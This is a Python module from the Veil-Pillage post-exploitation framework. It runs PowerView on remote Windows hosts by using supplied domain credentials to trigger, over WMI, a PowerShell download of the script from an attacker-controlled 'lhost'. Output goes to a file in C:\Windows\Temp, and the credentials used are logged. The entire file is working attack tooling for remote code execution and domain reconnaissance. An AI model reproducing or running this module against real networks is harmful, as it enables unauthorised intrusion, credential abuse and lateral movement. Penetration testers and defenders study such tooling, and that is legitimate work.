"""

Runs PowerView on a remote system, piping the output to
a specific result file.

Default behavior is Invoke-NetView, cmdlet and arguments can be specified.

See PowerView's README.md for all options:
    https://github.com/Veil-Framework/Veil-PowerView/blob/master/README.md


Note: this needs to be run under a domain account to make sense!


Module built by @harmj0y

"""

import settings

from lib import delivery_methods
from lib import smb

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "PowerView"
        self.description = ("Execute PowerView's functionality on a host. "
                            "The specific cmdlet to invoke can be specified.")

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "use_ssl"           :   ["false", "use https for hosting"],
                                    "lhost"             :   ["", "lhost for hosting"],
                                    "cmdlet"            :   ["Invoke-Netview", "cmdlet to invoke (with arguments)"],
                                    "out_file"          :   ["view.txt", "temporary output filename to write to"]}


    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        # no reason to run as winexe/smbexec, as those run as system
        trigger_method = "wmis"

        use_ssl = self.required_options["use_ssl"][0]
        lhost = self.required_options["lhost"][0]
        cmdlet = self.required_options["cmdlet"][0]
        out_file = self.required_options["out_file"][0]

        if "\\" not in out_file:
            # otherwise assume it's an absolute path
            out_file = "C:\\Windows\\Temp\\" + out_file 

        # path to the powerup.ps1 Powershell script
        secondStagePath = settings.VEIL_PILLAGE_PATH+"/data/misc/powerview.ps1"

        # command to kick off PowerView with
        scriptArguments = cmdlet + " | Out-File -Encoding ascii " + out_file

        # trigger the powershell download on all targets
        delivery_methods.powershellHostTrigger(self.targets, username, password, secondStagePath, lhost, scriptArguments, trigger_method, ssl=use_ssl)

        for target in self.targets:
            self.output += "[*] PowerView with '"+cmdlet+"' triggered using creds '"+username+":"+password+"' on "+target+" using "+trigger_method+"\n"
